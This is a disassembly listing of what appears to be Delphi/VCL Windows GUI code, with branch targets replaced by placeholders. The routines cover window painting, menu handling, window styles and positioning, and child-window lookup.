call sub_434b3c
push 0x0
xor ecx ecx
mov edx 0xb024
mov eax [ ebp - 0x4 ]
call sub_434b3c
push 0x0
xor ecx ecx
mov edx 0xb035
mov eax [ ebp - 0x4 ]
call sub_434b3c
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax [ ebp - 0x4 ]
call sub_434b3c
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax [ ebp - 0x4 ]
call sub_434b3c
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_434b3c
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x229 ]
sub al 0x2
je r-xdata
sub al 0x2
jne r-xdata
mov eax [ ebx + 0x8 ]
or [ eax + 0x18 ] 0x2
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov esi [ ebx + 0x8 ]
cmp [ esi ] 0x1
jne r-xdata
jmp r-xdata
mov eax [ ebx + 0x8 ]
or [ eax + 0x18 ] 0x1
jmp r-xdata
sub al 0x3
jne r-xdata
xor esi esi
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
xor ecx ecx
call sub_446a7c
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44d2cc
test eax eax
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d474
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44cc19
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_44cbfc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0xc ]
call sub_41db5c
mov eax [ rw-data ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0xc ]
call sub_41d9fc
mov eax [ ebp - 0x14 ]
mov ax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
lea ecx [ eax + 0x1c ]
mov edx [ ebp - 0xc ]
mov eax edi
call sub_447f64
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44cc03
xor edx edx
mov eax [ ebp - 0xc ]
call sub_41db5c
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
mov edx [ esi + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
xor ecx ecx
call sub_446a7c
mov edi eax
test edi edi
je r-xdata
test esi esi
je r-xdata
cmp eax [ ebp - 0x4 ]
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44d2cc
call sub_43a170
mov esi eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_43a170
push eax
call GetWindowDC
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44cd47
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d474
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44cd20
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
push eax
call SaveDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_44cd03
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_41db5c
mov eax [ rw-data ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0xc ]
call sub_41d9fc
lea eax [ esi + 0x10 ]
push eax
lea ecx [ esi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44cd0a
xor edx edx
mov eax [ ebp - 0xc ]
call sub_41db5c
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call RestoreDC
retn
push esi
call SetFocus
jmp r-xdata
call sub_43a170
mov esi eax
sub_44cd27
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43a170
push eax
call ReleaseDC
retn
sub_44cdd8
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x274 ]
push eax
call CallWindowProcA
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0xc ] eax
pop ebp
retn
sub_44ce24
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_44d300
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_44d34c
cmp [ eax + 0x22b ] 0x2
jne r-xdata
pop esi
pop ebx
pop ebp
retn
sub_44ce64
push ebp
mov ebp esp
add esp 0xffffff8c
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
sub eax 0xf
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
sub eax 0x5
je r-xdata
xor eax eax
push ebp
push sub_44d032
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call BeginPaint
mov edx [ ebp - 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_41d358
push eax
lea edx [ ebp - 0x6c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x6c ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call FillRect
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
sub eax 0x2b
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_437e24
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call GetWindowRect
lea ecx [ ebp - 0x74 ]
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_4334b4
mov eax [ ebp - 0x74 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp - 0x70 ]
mov [ ebp - 0x58 ] eax
mov ecx [ ebp - 0x58 ]
neg ecx
mov edx [ ebp - 0x5c ]
neg edx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_4322ac
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x254 ] 0x0
je r-xdata
push ebp
call sub_44cdd8
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
sub eax 0x45
jne r-xdata
retn
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call EndPaint
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call GetClientRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_41d358
push eax
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call FillRect
mov eax [ ebp - 0x4 ]
call sub_44d300
test eax eax
je r-xdata
push ebp
call sub_44cdd8
pop ecx
push ebp
call sub_44cdd8
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
mov dl 0x1
push ebp
call sub_44ce24
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0xffffffff
jmp r-xdata
xor edx edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
call sub_44a13c
jmp r-xdata
sub_44d044
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
mov ebx eax
mov ecx esi
mov eax ebx
call sub_44b30c
mov eax [ ebx + 0x254 ]
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x14
mov ecx [ esi + 0xc ]
mov edi [ esi + 0x4 ]
sub ecx edi
push ecx
mov ecx [ esi + 0x8 ]
mov edx [ esi ]
sub ecx edx
push ecx
push edi
push edx
push 0x1
push eax
call SetWindowPos
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
push esp
mov eax [ ebx + 0x254 ]
push eax
call GetClientRect
test eax eax
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebx + 0x254 ]
push eax
call InvalidateRect
sub_44d0b0
push ebx
push esi
push edi
push ecx
mov ebx eax
mov eax ebx
call sub_44b9a8
mov eax ebx
call sub_43a474
test al al
je r-xdata
mov eax ebx
call sub_41a130
mov edi eax
dec edi
test edi edi
jl r-xdata
push 0xffffffec
mov eax ebx
call sub_43a170
push eax
call GetWindowLongA
and eax 0xffffefff
and eax 0xffffdfff
and eax 0xffffbfff
mov [ esp ] eax
mov edx esp
mov eax ebx
call sub_436f94
mov eax [ esp ]
push eax
push 0xffffffec
mov eax ebx
call sub_43a170
push eax
call SetWindowLongA
pop edx
pop edi
pop esi
pop ebx
retn
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax ebx
call sub_41a104
call sub_4475c0
mov edx esi
mov eax ebx
call sub_41a104
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
sub_44d148
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x244 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x244 ] 0x1
xor edx edx
push ebp
push sub_44d1c5
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x244 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
jne r-xdata
mov dl [ eax + 0x5f ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ rw-data ]
mov dl [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
jmp r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
sub_44d1d0
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x228 ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x228 ] al
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_437710
sub_44d1fc
push esi
mov esi eax
cmp dl [ esi + 0x229 ]
je r-xdata
pop esi
retn
mov eax edx
mov [ esi + 0x229 ] al
sub al 0x2
je r-xdata
mov dl 0x1
sub al 0x3
je r-xdata
mov eax esi
call sub_437710
xor edx edx
jmp r-xdata
mov eax esi
call sub_44b488
test [ esi + 0x1c ] 0x10
jne r-xdata
sub_44d234
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov edi [ ebx + 0x30 ]
mov esi [ ebx + 0xa0 ]
mov ecx esp
mov eax ebx
call sub_433174
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp edi eax
jne r-xdata
cmp esi [ ebx + 0xa0 ]
je r-xdata
mov eax ebx
call sub_437710
sub_44d278
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0xa0 ]
je r-xdata
mov ecx edi
mov edx esi
mov eax ebx
call sub_433280
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
test esi esi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov al [ ebx + 0x229 ]
mov [ ebx + 0x280 ] al
mov [ ebx + 0x229 ] 0x0
mov al [ ebx + 0x280 ]
mov [ ebx + 0x229 ] al
jmp r-xdata
sub_44d2cc
push ebx
mov ebx eax
xor eax eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
pop ebx
retn
cmp [ ebx + 0x254 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x229
mov eax [ ebx + 0x254 ]
push eax
call SendMessageA
call sub_430850
sub_44d300
push ebx
push esi
push edi
xor edi edi
cmp [ eax + 0x22f ] 0x2
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0x254 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_450e70
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
inc edi
mov edx esi
mov eax [ rw-data ]
call sub_450e5c
cmp [ eax + 0x22f ] 0x1
jne r-xdata
sub_44d34c
push ebx
push esi
push edi
mov edi edx
cmp [ eax + 0x22f ] 0x2
jne r-xdata
xor eax eax
cmp [ eax + 0x254 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_450e70
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
dec edi
test edi edi
jl r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_450e5c
cmp [ eax + 0x22f ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_44d39c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c0
mov edx [ ebp + 0x8 ]
mov [ eax + 0x4 ] edx
mov edx [ ebx + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx eax
mov eax ebx
call sub_413704
mov al 0x1
pop ebx
pop ebp
retn 0x10
sub_44d3cc
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov ebp rw-data
xor eax eax
mov [ esp ] eax
push 0x2
mov eax ebx
call sub_43a170
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi eax
mov eax [ ebp ]
call sub_450e40
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp ]
call sub_450e40
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
push eax
mov eax sub_44d39c
push eax
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp ]
call sub_450e40
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_450e2c
mov [ esp ] eax
jmp r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp ]
call sub_450e2c
cmp edi [ eax + 0x4 ]
jne r-xdata
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_450e2c
mov [ esp ] eax
jmp r-xdata
mov edx esi
mov eax [ ebp ]
call sub_450e2c
cmp edi [ eax + 0x4 ]
jne r-xdata
sub_44d441
mov edx esi
call sub_413860
call sub_4030f0
inc esi
dec ebx
jne r-xdata
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
push eax
mov eax sub_44d39c
push eax
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp ]
call sub_450e40
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_450e2c
mov [ esp ] eax
jmp r-xdata
mov edx esi
mov eax [ ebp ]
call sub_450e2c
cmp edi [ eax + 0x4 ]
jne r-xdata
sub_44d4d0
push ebx
mov ebx eax
mov eax ebx
call sub_44d4c8
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x240 ]
call sub_421ba0
test eax eax
jne r-xdata
mov al 0x1
pop ebx
retn
sub_44d4f8
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x22f ]
je r-xdata
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
cmp [ esi + 0x230 ] 0x0
jne r-xdata
mov al [ esi + 0x22f ]
mov [ esi + 0x22f ] bl
cmp bl 0x2
je r-xdata
mov eax esi
call sub_4376c8
mov dl 0x1
mov eax esi
call sub_44d85c
cmp [ esi + 0x1a5 ] 0x0
jne r-xdata
cmp al 0x2
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov eax esi
call sub_44d8d8
mov edx eax
mov eax esi
call sub_433b10
cmp bl 0x1
jne r-xdata
mov eax esi
call sub_437864
mov dl 0x1
mov eax esi
call sub_44c87c
sub_44d578
push ebx
push esi
push edi
push ebp
mov ebp eax
cmp [ ebp + 0x22f ] 0x2
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x254 ] 0x0
je r-xdata
xor esi esi
mov eax [ ebp + 0x248 ]
test eax eax
je r-xdata
xor edi edi
mov eax [ ebp + 0x258 ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0x34 ]
mov esi eax
mov eax ebp
call sub_43a170
push eax
call GetMenu
cmp esi eax
setne bl
push edi
push esi
push 0x230
mov eax [ ebp + 0x254 ]
push eax
call SendMessageA
test bl bl
je r-xdata
call sub_443bbc
mov edi eax
mov eax ebp
call sub_43a170
push eax
call DrawMenuBar
sub_44d5f4
push ebx
mov ebx edx
mov [ eax + 0x260 ] ebx
test ebx ebx
je r-xdata
pop ebx
retn
mov edx eax
mov eax ebx
call sub_419bdc
xor edx edx
mov eax ebx
call sub_445554
sub_44d618
push ebx
mov ebx eax
cmp edx [ ebx + 0x258 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x258 ] edx
test edx edx
je r-xdata
mov eax ebx
call sub_44d578
mov eax edx
mov edx ebx
call sub_419bdc
sub_44d640
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44d806
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
mov eax [ ebx + 0x248 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
call sub_450e70
dec eax
test eax eax
jl r-xdata
test [ ebx + 0x1c ] 0x8
jne r-xdata
xor edx edx
call sub_447108
inc eax
mov [ ebp - 0x4 ] eax
xor edi edi
xor esi esi
test esi esi
je r-xdata
inc edi
dec [ ebp - 0x4 ]
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_450e5c
cmp ebx eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
mov eax esi
call sub_419bdc
mov [ ebx + 0x248 ] esi
test esi esi
je r-xdata
test [ esi + 0x1c ] 0x8
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_450e5c
cmp esi [ eax + 0x248 ]
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_4059ac
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1fc
call sub_403864
mov eax ebx
call sub_43a474
test al al
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x22e ] 0x0
je r-xdata
push 0x0
mov eax ebx
call sub_43a170
push eax
call SetMenu
mov eax [ ebx + 0x248 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
cmp [ ebx + 0x229 ] 0x3
je r-xdata
mov eax ebx
call sub_44d578
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d80d
lea eax [ ebp - 0x10 ]
call sub_403eac
retn
mov dl 0x1
mov eax ebx
call sub_44e704
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
cmp [ ebx + 0x22f ] 0x1
je r-xdata
mov eax ebx
call sub_43a474
test al al
je r-xdata
mov eax ebx
call sub_43a474
test al al
je r-xdata
mov eax [ ebx + 0x248 ]
mov edx [ eax ]
call [ edx + 0x34 ]
mov edi eax
mov eax ebx
call sub_43a170
push eax
call GetMenu
cmp edi eax
je r-xdata
push 0x0
mov eax ebx
call sub_43a170
push eax
call SetMenu
jmp r-xdata
mov eax ebx
call sub_43a170
mov edx eax
mov eax esi
call sub_447108
jmp r-xdata
mov eax [ ebx + 0x248 ]
mov edx [ eax ]
call [ edx + 0x34 ]
push eax
mov eax ebx
call sub_43a170
push eax
call SetMenu
sub_44d828
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44d814
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
test [ ebx + 0x1c ] 0x1
je r-xdata
cmp esi 0x24
jl r-xdata
mov [ ebx + 0x25c ] esi
cmp [ ebx + 0x25c ] 0x0
je r-xdata
sub_44d884
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_44d878
cmp bl al
je r-xdata
pop esi
pop ebx
retn
xor eax eax
mov [ esi + 0x25c ] eax
test bl bl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov [ esi + 0x25c ] eax
sub_44d8f0
push ebx
mov ebx eax
mov eax ebx
call sub_439788
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x70 ] 0xff00000f
jne r-xdata
mov eax ebx
call sub_44d8d8
cmp eax [ ebx + 0x70 ]
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_44d8d8
mov edx eax
mov eax ebx
call sub_433b10
mov edx 0xff00000f
mov eax ebx
call sub_433b10
pop ebx
retn
sub_44d974
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x22b ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x22b ] bl
test [ esi + 0x1c ] 0x10
jne r-xdata
cmp [ esi + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
push eax
mov eax esi
call sub_43a170
push eax
call ShowWindow
sub_44d9b4
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov ebx eax
mov al [ ebx + 0x231 ]
test al al
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
cmp [ edx + 0x44 ] 0x0
je r-xdata
xor edx edx
mov [ esp ] edx
cmp al 0x2
jne r-xdata
mov al [ ebx + 0x231 ]
cmp al 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_44d3cc
mov eax [ eax + 0x4 ]
mov [ esp ] eax
jmp r-xdata
cmp al 0x1
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x68 ] 0x0
je r-xdata
mov eax ebx
call sub_44d3cc
mov eax [ eax + 0x4 ]
mov [ esp + 0x4 ] eax
mov eax [ rw-data ]
call sub_450e40
dec eax
test eax eax
jl r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_450e2c
mov eax [ eax + 0x4 ]
mov [ esp ] eax
mov eax [ rw-data ]
mov eax [ eax + 0x68 ]
call sub_44d3cc
mov eax [ eax + 0x4 ]
mov [ esp ] eax
jmp r-xdata
inc eax
mov [ esp + 0x10 ] eax
xor esi esi
inc esi
dec [ esp + 0x10 ]
jne r-xdata
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_450e2c
mov eax [ eax + 0x4 ]
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_450e40
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
mov [ esp + 0x8 ] 0x0
inc [ esp + 0x8 ]
dec edi
jne r-xdata
mov al [ ebx + 0x230 ]
cmp al 0x4
jne r-xdata
mov edx [ esp + 0x8 ]
mov eax [ rw-data ]
call sub_450e2c
mov eax [ eax + 0x4 ]
cmp eax [ esp + 0x4 ]
jne r-xdata
cmp al 0x6
jne r-xdata
mov eax [ ebx + 0x48 ]
push eax
mov ebp [ ebx + 0x4c ]
push ebp
mov edx esi
mov eax [ rw-data ]
call sub_450e2c
call sub_450b30
push eax
mov edx esi
mov eax [ rw-data ]
call sub_450e2c
call sub_450b14
sub eax ebp
sar eax 0x1
jns r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_450e2c
call sub_450afc
mov ebp eax
add ebp [ ebx + 0x40 ]
mov edx [ esp + 0x8 ]
mov eax [ rw-data ]
call sub_450e2c
call sub_450afc
sub ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_450e2c
call sub_450afc
push eax
mov edx esi
mov eax [ rw-data ]
call sub_450e2c
call sub_450b48
pop edx
add edx eax
mov eax [ ebx + 0x48 ]
add eax ebp
cmp edx eax
jge r-xdata
mov eax [ ebx + 0x48 ]
push eax
mov ebp [ ebx + 0x4c ]
push ebp
mov edx esi
mov eax [ rw-data ]
call sub_450e2c
call sub_450b30
push eax
mov edx esi
mov eax [ rw-data ]
call sub_450e2c
call sub_450b14
sub eax ebp
sar eax 0x1
jns r-xdata
pop edx
add edx eax
push edx
mov edx esi
mov eax [ rw-data ]
call sub_450e2c
call sub_450afc
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_450e2c
call sub_450b48
sub eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
mov edx esi
mov eax [ rw-data ]
call sub_450e2c
call sub_450b30
add eax [ ebx + 0x44 ]
push eax
mov edx [ esp + 0xc ]
mov eax [ rw-data ]
call sub_450e2c
call sub_450b30
pop edx
sub edx eax
mov [ esp + 0xc ] edx
mov edx esi
mov eax [ rw-data ]
call sub_450e2c
call sub_450b30
push eax
mov edx esi
mov eax [ rw-data ]
call sub_450e2c
call sub_450b14
pop edx
add edx eax
mov eax [ esp + 0xc ]
add eax [ ebx + 0x4c ]
cmp edx eax
jge r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_450e2c
call sub_450afc
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_450e2c
call sub_450b48
add ebp eax
sub ebp [ ebx + 0x48 ]
pop edx
add edx eax
push edx
mov edx esi
mov eax [ rw-data ]
call sub_450e2c
call sub_450afc
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_450e2c
call sub_450b48
sub eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
add ebp eax
mov edx ebp
mov eax ebx
pop ecx
mov ebp [ eax ]
call [ ebp + 0x84 ]
jmp r-xdata
adc eax 0x0
mov eax [ ebx + 0x48 ]
push eax
mov eax [ ebx + 0x4c ]
push eax
mov ecx [ esp + 0x14 ]
mov edx ebp
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x84 ]
mov edx esi
mov eax [ rw-data ]
call sub_450e2c
call sub_450b30
push eax
mov edx esi
mov eax [ rw-data ]
call sub_450e2c
call sub_450b14
pop edx
add edx eax
sub edx [ ebx + 0x4c ]
mov [ esp + 0xc ] edx
add ebp eax
mov edx ebp
mov eax ebx
pop ecx
mov ebp [ eax ]
